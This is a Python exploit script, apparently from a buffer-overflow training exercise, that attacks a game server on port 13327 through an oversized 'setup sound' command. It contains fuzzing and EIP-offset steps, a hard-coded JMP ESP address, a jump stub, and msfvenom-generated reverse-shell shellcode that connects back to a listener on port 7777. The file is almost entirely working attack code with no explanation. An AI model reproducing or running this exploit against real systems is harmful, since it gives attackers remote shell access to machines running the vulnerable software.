import socket


def send_data(crash):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('127.0.0.1', 13327))
	s.send("\x11(setup sound " + crash + "\x90\x00#")
	data = s.recv(1024)
	s.close()

def crash():
	crash="A"*4379
	send_data(crash)

def eip_offset():
	crash=""
	send_data(crash)

def check_eip():
	crash = "A"*4368+"ACDC"+(4379-4368-4)*"C"
	send_data(crash)

#0x08134597 -> "\x97\x45\x13\x08"
jmpesp_addr="\x97\x45\x13\x08"
# add eax,12 = 83c00c | jmp eax = ffe0
jmpeax="\x83\xc0\x0c\xff\xe0"

def control_eip():
	crash = "A"*(4368)+jmpesp_addr+jmpeax+(4379-4368-len(jmpesp_addr)-len(jmpeax))*"\x90"
	send_data(crash)

def bad_chars():
	#badchars=""
	badchars=""
	crash = "\90"*10+badchars+"A"*(4368-10-len(badchars))+jmpesp_addr+jmpeax+(4379-4368-len(jmpesp_addr)-len(jmpeax))*"\x90"
	send_data(crash)


# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=7777 -b "\x00\x20" -f py
buf =  ""
buf += "\xbb\x4f\x1d\x5e\x7f\xd9\xc1\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xa5\xe1\xbc"
buf += "\x8a\x08\xc1\xb6\x96\x39\xb6\x6b\x33\xbf\xb1\x6d\x73"
buf += "\xd9\x0c\xed\xe7\x7c\x3f\xd1\xca\xfe\x76\x57\x2c\x96"
buf += "\xf7\xa7\xce\x67\x60\xaa\xce\x79\x11\x23\x2f\x35\xb7"
buf += "\x63\xe1\x66\x8b\x87\x88\x69\x26\x07\xd8\x01\xd7\x27"
buf += "\xae\xb9\x4f\x17\x7f\x5b\xf9\xee\x9c\xc9\xaa\x79\x83"
buf += "\x5d\x47\xb7\xc4"

def bof():
	#crash = 30*"\x90"+"A"*(4368-len(buf)-30)+buf+jmpesp_addr+jmpeax+(4379-4368-len(jmpesp_addr)-len(jmpeax))*"\x90"
	crash = "A"*(4368-len(buf))+buf+jmpesp_addr+jmpeax+(4379-4368-len(jmpesp_addr)-len(jmpeax))*"\x90"
	send_data(crash)

#control_eip()
#bad_chars()
bof()
